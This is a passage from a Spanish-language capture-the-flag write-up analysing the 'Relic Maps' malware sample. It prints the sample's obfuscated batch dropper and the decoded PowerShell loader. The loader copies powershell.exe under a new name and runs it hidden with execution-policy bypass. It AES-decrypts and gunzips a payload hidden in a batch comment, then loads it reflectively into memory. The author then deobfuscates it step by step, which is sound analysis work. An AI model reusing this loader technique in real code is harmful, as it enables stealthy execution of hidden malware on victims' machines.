<span class="mtk1">%CJnGNBkyYp%%UBndSzFkbH%%ujJtlzSIGW%%nwIWiBzpbz%%c</span><span class="mtk1">HFmSnCqnE%%kTEDvsZUvn%%JBRccySrUq%%ZqjBENExAX%%XBu</span><span class="mtk1">cLtReBQ%%BFTOQBPCju</span><span class="mtk1">%%vlwWETKcZH%%NCtxqhhPqI%%GOPdPuwuLd%%YcnfCLfyyS%%</span><span class="mtk1">JPfTcZlwxJ%%ualBOGvshk%%xprVJLooVF%%cIqyYRJWbQ%%ja</span><span class="mtk1">XcJXQMrV%%pMrovuxjjq%%KXASGLJNCX%%XzrrbwrpmM%%VCWZpprcdE%%tzMKflzfvX%</span><span class="mtk1">%ndjtYQuanY%%chXxviaBCr%%tHJYExMHlP%%WmUoySsDby%%U</span><span class="mtk1">rPeBlCopW%%lYCdEGtlPA%%eNOycQnIZD%%PxzdwcSExs%%VxroDYJQKR%%zhNAugCrcK</span><span class="mtk1">%%XUpMhOyyHB%%OOOxFGwzUd%</span>
<span class="mtk5">cls</span>
%dzPrbmmccE%%xQseEVnPet%
<span class="mtk1">%eDhTebXJLa%%vShQyqnqqU%%KsuJogdoiJ%%uVLEiIUjzw%%SJsEzuInUY%%gNELMMjyFY%%XIAbFAgCIP%%weRTbbZPjT%%yQujDHraSv%%zwDBykiqZZ%%nfEeCcWKKK%%MtoMzhoqyY%%igJmqZApvQ%%SIQjFslpHA%%KHqiJghRbq%%WSRbQhwrOC%%BGoTReCegg%%WYJXnBQBDj%%SIneUaQPty%%WTAeYdswqF%%EdLUuXiTNo%%rVOFKTskYR%%nMLIkcyFZj%%jtkYEPXtKX%%RWcegafVtf%%KhyyrSrcKr%%zDUDeXKPaV%%VZAbZqJHBk%%XClTzcVMGM%%xVIsxobyZi%%qpUykKHwzb%%iKAAuWsbec%%cYinxarhDL%%olHsTHINJO%%uynFENuiYB%%WauWfrgGak%%tzSNMWchGN%%oFspIELDJK%%FijcPoQLnC%%AbMyvUGzSH%%LmCknrHfoB%%GDXqElqPYy%%gqUdnmSTUN%%YlKbYsFYPy%%GLwLVWewUj%%EQAuBusyXb%%yOkBDuSVrl%%FraARuTjiq%%hwZKiiLqAE%%ahbOZSBViB%%djeIEnPaCg%%AiqHTcPzsv%%JCuNlxqlBZ%%TYbHmXrqgV%%sLNudRRtUX%%dbDMRBPrxg%%XEyDmChJvW%%KytxcYPZKt%%GWrDWSvoPL%%haSZYOmkiA%%JhYYmEHfJT%%LPGeAanVGt%%hTTJOKGuzo%%MFRjJyYsrs%%kpEWZrtOzX%%BrDOtQoojB%%YnGvhgYxvb%%cUDojRpXKx%%rSVBNvbdPT%%kJjQuXIjOT%%tVtxVGNpFB%%BqEMjgsfHM%%fVHBRsLNUl%%jgiQdwyxFg%%HLynrUfwGo%%FCBcNynRGD%%VavtsuhNIN%%HUAAetwukX%%nogFGGEgdF%%iHRclHpeVX%%MrNTGKcbYu%%bTHJpHTPMM%%QbKdEZdxpx%%drymkVAnZW%%DDiJEpaiME%%OAsjgKHKoH%%HFLAqJuuyu%%gFQQimTbzp%%YULKJDZpgz%%oQYrpYRHsU%%VGKsxiJBaT%%RGlZIMTaRM%%JenYfqHzBk%%vmIEtsktnA%%TypmIIEYJC%%eQPFkQsLmh%%AkaPyEXHFq%%BANrSlObpx%%LIQYgFxctD%%ZygfZJxAOd%%KXttaDcyMZ%%brwOvSubJT%%hVncqdtHrj%%OonlMOpxYC%%CZpuCIcrKh%%owRVWPJqcX%%jugDlMdkcG%%DXdgqiFTAH%%acXjUrxrpX%%eYuashSMjP%%ESpdErsKEO%%kQQvXhxXIT%%pLUeCEDcNj%%pTKKchMUFD%%ZMNBNnhYdl%%KVdpASYkBZ%%OpWuyrggtP%%uDsfTCYsro%%wEZCzuPukj%%jCsFOJQsdv%%hbFnQgCXwX%%UFSmCjquVd%%BMVjGSkNrk%%MFpVhvZMMs%%SRYmoDJgcF%%svwZUufvHX%%WPGlloqWfh%%kEHDlJOIVc%%jdKMRqipbM%%pEeOvclMbZ%%nMbUuONTOk%%GwAFOSfUtV%%gbVsRGzTij%%ybHVOwcPrc%%CpAQgSdzaC%%XqtgTmRIdO%%pUKFMEPFQs%%QpDqsQAemY%%CZTFliIBbC%%EuMCNHEVeC%%dyJHMHMcNc%%LNwemqbftD%%VnDoNvCbDL%%mFZJVdqlTD%%vGOYQQYIpx%%GzBAHPVuTq%%fLycQgNMii%%ZPlPiozEyW%%xULgeMdzcg%%iVrCyJhMiJ%%dlzhxQnMss%%pqWXTkasXe%%doKcadyJqy%%hNwOTmvEJo%%yqhJQSZuJo%%JPOdGPAwht%%rEvTlCThdH%%PwJJFMgamh%%eeacPrYshd%%LYxpWUVnyn%%YRqcyngfyU%%IAkZpnEseT%%DAaZVQYtML%%QTBYjmNXEB%%lSUnvlNyZI%%pCjFJxRqgH%%oMsMdPYmPd%%AGOCIKFMEK%%dAuevoJWoL%%uwRWnyAikF%%mBIWiJNHWZ%%RfMwENsorP%%gbXeIdPSoj%%kxCYxBSxVM%%AbZpTpKurz%%glRvzlEEoe%%TVsNOuCNZd%%VUsEoebHks%%tuAPcYGhzl%%WojQSFImBz%%NXvoEmTmgu%%jWtWLzuDKP%%NvnNgHLBLJ%%vPgKEvZmlQ%%ftaecaUnft%%lfCLMrJHhW%%ArAxZuPIrp%%zhsTKtujLg%%MxwsyqmvYm%%MsfoqNTDfI%%klVPUdMJas%%XzWakcViZI%%htJeDhbeDW%%ARecVABHyu%%EDuGpmwedn%%SKEwAQBRlN%%bIgeRgvTeJ%%AnKEeEZdOq%%KXapePmHCe%%YKwLsVwqOj%%QCZuMFaZsV%%RycUceHQZc%%TOqZKQRZli%%hIpFAiXGDz%%PmpGnAHBIo%%nGqMpclaJV%%NbOjNijxuU%%hbnAmGyJMk%%jpqWVBsCpx%%WXWHLOygSe%%rjhOhltPzI%%DCnzMxKRnm%%QGiWXkfFPy%%isQISZiBPJ%%iCcGUuJxVn%%dGSGnKbkQW%%gNabAkLFGN%%pibEdoDBbD%%AHKCuBAkui%%YYKSCuCbgJ%%IeRiYUFnCZ%%hzjnwzdyGY%%KAlyOryibJ%%MBvrUwPCDz%%WmHvayPxwd%%reviZiSttH%%wwmTmFdRsZ%%JBUgbyTPxp%%BaMYsIgnsM%%DwiWdAaOiv%%vXewtPjogB%%odWdfvJnBE%%yPzFwnsYdA%%xfHbUEWpFC%%ySgQyAAfQH%%QMmDXFyyag%%xllGdjvUjB%%zuIYfGJIhV%%MmhvJKSdep%%fxpyemHAMo%%eFWpiweoyr%%WQqetkePWs%%qsPTvcejTS%%YiVTQhqRnm%%GEFNspgkfU%%iREuYMPcTg%%rVuFsOUxnm%%UmCJMMMcBg%%VUeZKgDBUe%%roXhULjavE%%uIWSZVpUHl%%ZNBNkxQuUl%%ktDjVGpvOa%%CMHWMmXlZO%%RITIeDNkWx%%UPfjubfNXt%%GTgGJngEbX%%zFvgtBzUer%%TfyrgNGxBL%%hknFiXCnZQ%%xijYXotZPT%%BlIFABuPAW%%GJcpQprPXv%%YmUoUKWAtR%%tHHIjVCHeH%%DNNdkNfTiI%%XEcuUpquLQ%%EUwICZcugV%%MJKqSlzRdg%%FcrKUOEnOU%%EiWocIreAk%%LLNnWnTLBJ%%QzqEkBCLON%%uOGlqENvnk%%TuqTvTpeOG%%USLedfRsdA%%fFqNPWfBWr%%AyyrPvjwjr%%mxXhSCdBil%%MusMeoeDey%%OOiwgwuupI%%WvjMoIIiUn%%TEtLFfgLmA%%rFsKCxpAbv%%hImzprlFyw%%GVIREkvxRa%%qIhOqqdyjR%%shhyfkrTvn%%UAnQUvXBfs%%bSIafzAxiZ%%oNvGdyNkLt%%SCbDgQuqTU%%tBsRPAyhtG%%KUKwZheGNw%%INPLAzQfUo%%ekEoGMuERC%%aGQeJYSFDZ%%LODxmGMGqq%%KtmeCApwQn%%MAPkvbWKbC%%HlBVDpGgba%%ZNnASGtLCj%%IwOqmlYsbl%%JbFOJyRrBm%%TiuQnZmosP%%HkiSTlwlIs%%rofQqYizRu%%OckpqzbYcn%%YJZmDySMUy%%cGJiVEdEzp%%QNxYaFZSBu%%jxjvtHoTnR%%fvEtritbuM%%wxzMwkmbmY%%yZlAoExoOn%%pjrIjvjdGR%%mYyPXMYwYi%%vnHosfjdeN%%LfngwmfRCb%%bivuMABwCB%%GapFScCcpe%%lfYSggLrsL%%GhTXhmRnCR%%ENADhKPHot%%KdByPVjCnF%%PjdRUyhsyG%%kpzxAxFvLw%%rddZbDFvhl%</span>
<span class="mtk5">exit</span><span class="mtk1"> /b</span>
</code></pre></div><p>Hay un comentario muy sospechoso con una larga cadena codificada en Base64.</p><p>En lugar de tratar manualmente de ver qu茅 estaba ejecutando el <em>malware</em>, modifiqu茅 un poco el c贸digo para imprimir lo que se supon铆a que deb铆a ejecutar en una m谩quina de Windows (usando <code>echo</code> en las 煤ltimas l铆neas):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3"># ...</span>

<span class="mtk1">%eUFw%</span><span class="mtk4">"KsuJogdoiJ= -no"</span>
<span class="mtk1">%eUFw%</span><span class="mtk4">"djeIEnPaCg=tsWi"</span>
<span class="mtk1">%eUFw%</span><span class="mtk4">"brwOvSubJT=e = "</span>
<span class="mtk1">%eUFw%</span><span class="mtk4">"TOqZKQRZli=uZOc"</span>
<span class="mtk5">echo</span> <span class="mtk1">%CJnGNBkyYp%%UBndSzFkbH%%ujJtlzSIGW%%nwIWiBzpbz%%c</span><span class="mtk1">HFmSnCqnE%%kTEDvsZUvn%%JBRccySrUq%%ZqjBENExAX%%XBu</span><span class="mtk1">cLtReBQ%%BFTOQBPCju</span><span class="mtk1">%%vlwWETKcZH%%NCtxqhhPqI%%GOPdPuwuLd%%YcnfCLfyyS%%</span><span class="mtk1">JPfTcZlwxJ%%ualBOGvshk%%xprVJLooVF%%cIqyYRJWbQ%%ja</span><span class="mtk1">XcJXQMrV%%pMrovuxjjq%%KXASGLJNCX%%XzrrbwrpmM%%VCWZpprcdE%%tzMKflzfvX%</span><span class="mtk1">%ndjtYQuanY%%chXxviaBCr%%tHJYExMHlP%%WmUoySsDby%%U</span><span class="mtk1">rPeBlCopW%%lYCdEGtlPA%%eNOycQnIZD%%PxzdwcSExs%%VxroDYJQKR%%zhNAugCrcK</span><span class="mtk1">%%XUpMhOyyHB%%OOOxFGwzUd%</span>
<span class="mtk3">:: cls</span>
<span class="mtk5">echo</span> %dzPrbmmccE%%xQseEVnPet%
<span class="mtk5">echo</span> <span class="mtk1">%eDhTebXJLa%%vShQyqnqqU%%KsuJogdoiJ%%uVLEiIUjzw%%SJsEzuInUY%%gNELMMjyFY%%XIAbFAgCIP%%weRTbbZPjT%%yQujDHraSv%%zwDBykiqZZ%%nfEeCcWKKK%%MtoMzhoqyY%%igJmqZApvQ%%SIQjFslpHA%%KHqiJghRbq%%WSRbQhwrOC%%BGoTReCegg%%WYJXnBQBDj%%SIneUaQPty%%WTAeYdswqF%%EdLUuXiTNo%%rVOFKTskYR%%nMLIkcyFZj%%jtkYEPXtKX%%RWcegafVtf%%KhyyrSrcKr%%zDUDeXKPaV%%VZAbZqJHBk%%XClTzcVMGM%%xVIsxobyZi%%qpUykKHwzb%%iKAAuWsbec%%cYinxarhDL%%olHsTHINJO%%uynFENuiYB%%WauWfrgGak%%tzSNMWchGN%%oFspIELDJK%%FijcPoQLnC%%AbMyvUGzSH%%LmCknrHfoB%%GDXqElqPYy%%gqUdnmSTUN%%YlKbYsFYPy%%GLwLVWewUj%%EQAuBusyXb%%yOkBDuSVrl%%FraARuTjiq%%hwZKiiLqAE%%ahbOZSBViB%%djeIEnPaCg%%AiqHTcPzsv%%JCuNlxqlBZ%%TYbHmXrqgV%%sLNudRRtUX%%dbDMRBPrxg%%XEyDmChJvW%%KytxcYPZKt%%GWrDWSvoPL%%haSZYOmkiA%%JhYYmEHfJT%%LPGeAanVGt%%hTTJOKGuzo%%MFRjJyYsrs%%kpEWZrtOzX%%BrDOtQoojB%%YnGvhgYxvb%%cUDojRpXKx%%rSVBNvbdPT%%kJjQuXIjOT%%tVtxVGNpFB%%BqEMjgsfHM%%fVHBRsLNUl%%jgiQdwyxFg%%HLynrUfwGo%%FCBcNynRGD%%VavtsuhNIN%%HUAAetwukX%%nogFGGEgdF%%iHRclHpeVX%%MrNTGKcbYu%%bTHJpHTPMM%%QbKdEZdxpx%%drymkVAnZW%%DDiJEpaiME%%OAsjgKHKoH%%HFLAqJuuyu%%gFQQimTbzp%%YULKJDZpgz%%oQYrpYRHsU%%VGKsxiJBaT%%RGlZIMTaRM%%JenYfqHzBk%%vmIEtsktnA%%TypmIIEYJC%%eQPFkQsLmh%%AkaPyEXHFq%%BANrSlObpx%%LIQYgFxctD%%ZygfZJxAOd%%KXttaDcyMZ%%brwOvSubJT%%hVncqdtHrj%%OonlMOpxYC%%CZpuCIcrKh%%owRVWPJqcX%%jugDlMdkcG%%DXdgqiFTAH%%acXjUrxrpX%%eYuashSMjP%%ESpdErsKEO%%kQQvXhxXIT%%pLUeCEDcNj%%pTKKchMUFD%%ZMNBNnhYdl%%KVdpASYkBZ%%OpWuyrggtP%%uDsfTCYsro%%wEZCzuPukj%%jCsFOJQsdv%%hbFnQgCXwX%%UFSmCjquVd%%BMVjGSkNrk%%MFpVhvZMMs%%SRYmoDJgcF%%svwZUufvHX%%WPGlloqWfh%%kEHDlJOIVc%%jdKMRqipbM%%pEeOvclMbZ%%nMbUuONTOk%%GwAFOSfUtV%%gbVsRGzTij%%ybHVOwcPrc%%CpAQgSdzaC%%XqtgTmRIdO%%pUKFMEPFQs%%QpDqsQAemY%%CZTFliIBbC%%EuMCNHEVeC%%dyJHMHMcNc%%LNwemqbftD%%VnDoNvCbDL%%mFZJVdqlTD%%vGOYQQYIpx%%GzBAHPVuTq%%fLycQgNMii%%ZPlPiozEyW%%xULgeMdzcg%%iVrCyJhMiJ%%dlzhxQnMss%%pqWXTkasXe%%doKcadyJqy%%hNwOTmvEJo%%yqhJQSZuJo%%JPOdGPAwht%%rEvTlCThdH%%PwJJFMgamh%%eeacPrYshd%%LYxpWUVnyn%%YRqcyngfyU%%IAkZpnEseT%%DAaZVQYtML%%QTBYjmNXEB%%lSUnvlNyZI%%pCjFJxRqgH%%oMsMdPYmPd%%AGOCIKFMEK%%dAuevoJWoL%%uwRWnyAikF%%mBIWiJNHWZ%%RfMwENsorP%%gbXeIdPSoj%%kxCYxBSxVM%%AbZpTpKurz%%glRvzlEEoe%%TVsNOuCNZd%%VUsEoebHks%%tuAPcYGhzl%%WojQSFImBz%%NXvoEmTmgu%%jWtWLzuDKP%%NvnNgHLBLJ%%vPgKEvZmlQ%%ftaecaUnft%%lfCLMrJHhW%%ArAxZuPIrp%%zhsTKtujLg%%MxwsyqmvYm%%MsfoqNTDfI%%klVPUdMJas%%XzWakcViZI%%htJeDhbeDW%%ARecVABHyu%%EDuGpmwedn%%SKEwAQBRlN%%bIgeRgvTeJ%%AnKEeEZdOq%%KXapePmHCe%%YKwLsVwqOj%%QCZuMFaZsV%%RycUceHQZc%%TOqZKQRZli%%hIpFAiXGDz%%PmpGnAHBIo%%nGqMpclaJV%%NbOjNijxuU%%hbnAmGyJMk%%jpqWVBsCpx%%WXWHLOygSe%%rjhOhltPzI%%DCnzMxKRnm%%QGiWXkfFPy%%isQISZiBPJ%%iCcGUuJxVn%%dGSGnKbkQW%%gNabAkLFGN%%pibEdoDBbD%%AHKCuBAkui%%YYKSCuCbgJ%%IeRiYUFnCZ%%hzjnwzdyGY%%KAlyOryibJ%%MBvrUwPCDz%%WmHvayPxwd%%reviZiSttH%%wwmTmFdRsZ%%JBUgbyTPxp%%BaMYsIgnsM%%DwiWdAaOiv%%vXewtPjogB%%odWdfvJnBE%%yPzFwnsYdA%%xfHbUEWpFC%%ySgQyAAfQH%%QMmDXFyyag%%xllGdjvUjB%%zuIYfGJIhV%%MmhvJKSdep%%fxpyemHAMo%%eFWpiweoyr%%WQqetkePWs%%qsPTvcejTS%%YiVTQhqRnm%%GEFNspgkfU%%iREuYMPcTg%%rVuFsOUxnm%%UmCJMMMcBg%%VUeZKgDBUe%%roXhULjavE%%uIWSZVpUHl%%ZNBNkxQuUl%%ktDjVGpvOa%%CMHWMmXlZO%%RITIeDNkWx%%UPfjubfNXt%%GTgGJngEbX%%zFvgtBzUer%%TfyrgNGxBL%%hknFiXCnZQ%%xijYXotZPT%%BlIFABuPAW%%GJcpQprPXv%%YmUoUKWAtR%%tHHIjVCHeH%%DNNdkNfTiI%%XEcuUpquLQ%%EUwICZcugV%%MJKqSlzRdg%%FcrKUOEnOU%%EiWocIreAk%%LLNnWnTLBJ%%QzqEkBCLON%%uOGlqENvnk%%TuqTvTpeOG%%USLedfRsdA%%fFqNPWfBWr%%AyyrPvjwjr%%mxXhSCdBil%%MusMeoeDey%%OOiwgwuupI%%WvjMoIIiUn%%TEtLFfgLmA%%rFsKCxpAbv%%hImzprlFyw%%GVIREkvxRa%%qIhOqqdyjR%%shhyfkrTvn%%UAnQUvXBfs%%bSIafzAxiZ%%oNvGdyNkLt%%SCbDgQuqTU%%tBsRPAyhtG%%KUKwZheGNw%%INPLAzQfUo%%ekEoGMuERC%%aGQeJYSFDZ%%LODxmGMGqq%%KtmeCApwQn%%MAPkvbWKbC%%HlBVDpGgba%%ZNnASGtLCj%%IwOqmlYsbl%%JbFOJyRrBm%%TiuQnZmosP%%HkiSTlwlIs%%rofQqYizRu%%OckpqzbYcn%%YJZmDySMUy%%cGJiVEdEzp%%QNxYaFZSBu%%jxjvtHoTnR%%fvEtritbuM%%wxzMwkmbmY%%yZlAoExoOn%%pjrIjvjdGR%%mYyPXMYwYi%%vnHosfjdeN%%LfngwmfRCb%%bivuMABwCB%%GapFScCcpe%%lfYSggLrsL%%GhTXhmRnCR%%ENADhKPHot%%KdByPVjCnF%%PjdRUyhsyG%%kpzxAxFvLw%%rddZbDFvhl%</span>  
<span class="mtk5">exit</span><span class="mtk1"> /b</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#021944!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">PS ...\Relic Maps> <span class="pwsh-yellow">.\window-modified.bat</span>
copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe /y ".\Relic Maps\window.bat.exe"
cd ".\Relic Maps\"
"window.bat.exe" -noprofile -windowstyle hidden -ep bypass -command $eIfqq = [System.IO.File]::('txeTllAdaeR'[-1..-11] -join '')('.\Relic Maps\window.bat').Split([Environment]::NewLine);foreach ($YiLGW in $eIfqq) { if ($YiLGW.StartsWith(':: ')) {  $VuGcO = $YiLGW.Substring(3); break; }; };$uZOcm = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')($VuGcO);$BacUA = New-Object System.Security.Cryptography.AesManaged;$BacUA.Mode = [System.Security.Cryptography.CipherMode]::CBC;$BacUA.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7;$BacUA.Key = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('0xdfc6tTBkD+M0zxU7egGVErAsa/NtkVIHXeHDUiW20=');$BacUA.IV = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('2hn/J717js1MwdbbqMn7Lw==');$Nlgap = $BacUA.CreateDecryptor();$uZOcm = $Nlgap.TransformFinalBlock($uZOcm, 0, $uZOcm.Length);$Nlgap.Dispose();$BacUA.Dispose();$mNKMr = New-Object System.IO.MemoryStream(, $uZOcm);$bTMLk = New-Object System.IO.MemoryStream;$NVPbn = New-Object System.IO.Compression.GZipStream($mNKMr, [IO.Compression.CompressionMode]::Decompress);$NVPbn.CopyTo($bTMLk);$NVPbn.Dispose();$mNKMr.Dispose();$bTMLk.Dispose();$uZOcm = $bTMLk.ToArray();$gDBNO = [System.Reflection.Assembly]::('daoL'[-1..-4] -join '')($uZOcm);$PtfdQ = $gDBNO.EntryPoint;$PtfdQ.Invoke($null, (, [string[]] ('')))  
</code></pre></div><h3 id="desofuscaci贸n-de-powershell">Desofuscaci贸n de PowerShell</h3><p>El <em>script</em> de Batch est谩 tratando de ejecutar c贸digo de PowerShell en l铆nea, que nuevamente est谩 un poco ofuscado. Vamos a desofuscarlo un poco:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">$eIfqq </span><span class="mtk5">=</span><span class="mtk1"> [</span><span class="mtk7 mtki">System.IO.File</span><span class="mtk1">]::(</span><span class="mtk4">'txeTllAdaeR'</span><span class="mtk1">[</span><span class="mtk6">-1</span><span class="mtk5">..</span><span class="mtk6">-11</span><span class="mtk1">] </span><span class="mtk5">-join</span><span class="mtk1"> </span><span class="mtk4">''</span><span class="mtk1">)(</span><span class="mtk4">'.\Relic Maps\window.bat'</span><span class="mtk1">).Split([</span><span class="mtk7 mtki">Environment</span><span class="mtk1">]::NewLine);</span>  

<span class="mtk5">foreach</span><span class="mtk1"> ($YiLGW </span><span class="mtk5">in</span><span class="mtk1"> $eIfqq) {</span>
<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> ($YiLGW.StartsWith(</span><span class="mtk4">':: '</span><span class="mtk1">)) {</span>
<span class="mtk1">    $VuGcO </span><span class="mtk5">=</span><span class="mtk1"> $YiLGW.Substring(</span><span class="mtk6">3</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk5">break</span><span class="mtk1">;</span>
<span class="mtk1">  };</span>
<span class="mtk1">};</span>

<span class="mtk1">$uZOcm </span><span class="mtk5">=</span><span class="mtk1"> [</span><span class="mtk7 mtki">System.Convert</span><span class="mtk1">]::(</span><span class="mtk4">'gnirtS46esaBmorF'</span><span class="mtk1">[</span><span class="mtk6">-1</span><span class="mtk5">..</span><span class="mtk6">-16</span><span class="mtk1">] </span><span class="mtk5">-join</span><span class="mtk1"> </span><span class="mtk4">''</span><span class="mtk1">)($VuGcO);</span>
<span class="mtk1">$BacUA </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">New-Object</span><span class="mtk1"> System.Security.Cryptography.AesManaged;</span>
<span class="mtk1">$BacUA.Mode </span><span class="mtk5">=</span><span class="mtk1"> [</span><span class="mtk7 mtki">System.Security.Cryptography.CipherMode</span><span class="mtk1">]::CBC;</span>
<span class="mtk1">$BacUA.Padding </span><span class="mtk5">=</span><span class="mtk1"> [</span><span class="mtk7 mtki">System.Security.Cryptography.PaddingMode</span><span class="mtk1">]::PKCS7;</span>
<span class="mtk1">$BacUA.Key </span><span class="mtk5">=</span><span class="mtk1"> [</span><span class="mtk7 mtki">System.Convert</span><span class="mtk1">]::(</span><span class="mtk4">'gnirtS46esaBmorF'</span><span class="mtk1">[</span><span class="mtk6">-1</span><span class="mtk5">..</span><span class="mtk6">-16</span><span class="mtk1">] </span><span class="mtk5">-join</span><span class="mtk1"> </span><span class="mtk4">''</span><span class="mtk1">)(</span><span class="mtk4">'0xdfc6tTBkD+M0zxU7egGVErAsa/NtkVIHXeHDUiW20='</span><span class="mtk1">);</span>
<span class="mtk1">$BacUA.IV </span><span class="mtk5">=</span><span class="mtk1"> [</span><span class="mtk7 mtki">System.Convert</span><span class="mtk1">]::(</span><span class="mtk4">'gnirtS46esaBmorF'</span><span class="mtk1">[</span><span class="mtk6">-1</span><span class="mtk5">..</span><span class="mtk6">-16</span><span class="mtk1">] </span><span class="mtk5">-join</span><span class="mtk1"> </span><span class="mtk4">''</span><span class="mtk1">)(</span><span class="mtk4">'2hn/J717js1MwdbbqMn7Lw=='</span><span class="mtk1">);</span>
<span class="mtk1">$Nlgap </span><span class="mtk5">=</span><span class="mtk1"> $BacUA.CreateDecryptor();</span>
<span class="mtk1">$uZOcm </span><span class="mtk5">=</span><span class="mtk1"> $Nlgap.TransformFinalBlock($uZOcm</span><span class="mtk5">,</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk5">,</span><span class="mtk1"> $uZOcm.Length);</span>
<span class="mtk1">$Nlgap.Dispose();</span>
<span class="mtk1">$BacUA.Dispose();</span>
<span class="mtk1">$mNKMr </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">New-Object</span><span class="mtk1"> System.IO.MemoryStream(</span><span class="mtk5">,</span><span class="mtk1"> $uZOcm);</span>
<span class="mtk1">$bTMLk </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">New-Object</span><span class="mtk1"> System.IO.MemoryStream;</span>
<span class="mtk1">$NVPbn </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">New-Object</span><span class="mtk1"> System.IO.Compression.GZipStream($mNKMr</span><span class="mtk5">,</span><span class="mtk1"> [</span><span class="mtk7 mtki">IO.Compression.CompressionMode</span><span class="mtk1">]::Decompress);</span>
<span class="mtk1">$NVPbn.CopyTo($bTMLk);</span>
<span class="mtk1">$NVPbn.Dispose();</span>
<span class="mtk1">$mNKMr.Dispose();</span>
<span class="mtk1">$bTMLk.Dispose();</span>
<span class="mtk1">$uZOcm </span><span class="mtk5">=</span><span class="mtk1"> $bTMLk.ToArray();</span>
<span class="mtk1">$gDBNO </span><span class="mtk5">=</span><span class="mtk1"> [</span><span class="mtk7 mtki">System.Reflection.Assembly</span><span class="mtk1">]::(</span><span class="mtk4">'daoL'</span><span class="mtk1">[</span><span class="mtk6">-1</span><span class="mtk5">..</span><span class="mtk6">-4</span><span class="mtk1">] </span><span class="mtk5">-join</span><span class="mtk1"> </span><span class="mtk4">''</span><span class="mtk1">)($uZOcm);</span>
<span class="mtk1">$PtfdQ </span><span class="mtk5">=</span><span class="mtk1"> $gDBNO.EntryPoint;</span>
<span class="mtk1">$PtfdQ.Invoke(</span><span class="mtk6">$null</span><span class="mtk5">,</span><span class="mtk1"> (</span><span class="mtk5">,</span><span class="mtk1"> [</span><span class="mtk7 mtki">string</span><span class="mtk1">[]] (</span><span class="mtk4">''</span><span class="mtk1">))) </span>
</code></pre></div><p>Bueno, a煤n es un poco ilegible, podemos usar PowerShell para evaluar algunas expresiones y reemplazarlas en el c贸digo:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">pwsh</span>
PowerShell 7.3.3
PS .../Relic Maps&gt; <span class="code-dark-cyan">'txeTllAdaeR'</span><span class="code-white">[</span>-1<span class="code-grey">..</span>-11<span class="code-white">]</span> <span class="code-grey">-join</span> <span class="code-dark-cyan">''</span>
ReadAllText
PS .../Relic Maps&gt; <span class="code-dark-cyan">'gnirtS46esaBmorF'</span><span class="code-white">[</span>-1<span class="code-grey">..</span>-16<span class="code-white">]</span> <span class="code-grey">-join</span> <span class="code-dark-cyan">''</span>  
FromBase64String
PS .../Relic Maps&gt; <span class="code-dark-cyan">'daoL'</span><span class="code-white">[</span>-1<span class="code-grey">..</span>-4<span class="code-white">]</span> <span class="code-grey">-join</span> <span class="code-dark-cyan">''</span>
Load
</code></pre></div><p>Entonces, esto es algo m谩s legible:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">$content </span><span class="mtk5">=</span><span class="mtk1"> [</span><span class="mtk7 mtki">System.IO.File</span><span class="mtk1">]::ReadAllText(</span><span class="mtk4">'.\Relic Maps\window.bat'</span><span class="mtk1">).Split([</span><span class="mtk7 mtki">Environment</span><span class="mtk1">]::NewLine);</span>

<span class="mtk5">foreach</span><span class="mtk1"> ($line </span><span class="mtk5">in</span><span class="mtk1"> $content) {</span>
<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> ($line.StartsWith(</span><span class="mtk4">':: '</span><span class="mtk1">)) {</span>
<span class="mtk1">    $comment </span><span class="mtk5">=</span><span class="mtk1"> $line.Substring(</span><span class="mtk6">3</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk5">break</span><span class="mtk1">;</span>
<span class="mtk1">  };</span>
<span class="mtk1">};</span>

<span class="mtk1">$payload </span><span class="mtk5">=</span><span class="mtk1"> [</span><span class="mtk7 mtki">System.Convert</span><span class="mtk1">]::FromBase64String($comment);</span>
<span class="mtk1">$aes </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">New-Object</span><span class="mtk1"> System.Security.Cryptography.AesManaged;</span>
<span class="mtk1">$aes.Mode </span><span class="mtk5">=</span><span class="mtk1"> [</span><span class="mtk7 mtki">System.Security.Cryptography.CipherMode</span><span class="mtk1">]::CBC;</span>
<span class="mtk1">$aes.Padding </span><span class="mtk5">=</span><span class="mtk1"> [</span><span class="mtk7 mtki">System.Security.Cryptography.PaddingMode</span><span class="mtk1">]::PKCS7;</span>
<span class="mtk1">$aes.Key </span><span class="mtk5">=</span><span class="mtk1"> [</span><span class="mtk7 mtki">System.Convert</span><span class="mtk1">]::FromBase64String(</span><span class="mtk4">'0xdfc6tTBkD+M0zxU7egGVErAsa/NtkVIHXeHDUiW20='</span><span class="mtk1">);</span>
<span class="mtk1">$aes.IV </span><span class="mtk5">=</span><span class="mtk1"> [</span><span class="mtk7 mtki">System.Convert</span><span class="mtk1">]::FromBase64String(</span><span class="mtk4">'2hn/J717js1MwdbbqMn7Lw=='</span><span class="mtk1">);</span>
<span class="mtk1">$Nlgap </span><span class="mtk5">=</span><span class="mtk1"> $aes.CreateDecryptor();</span>
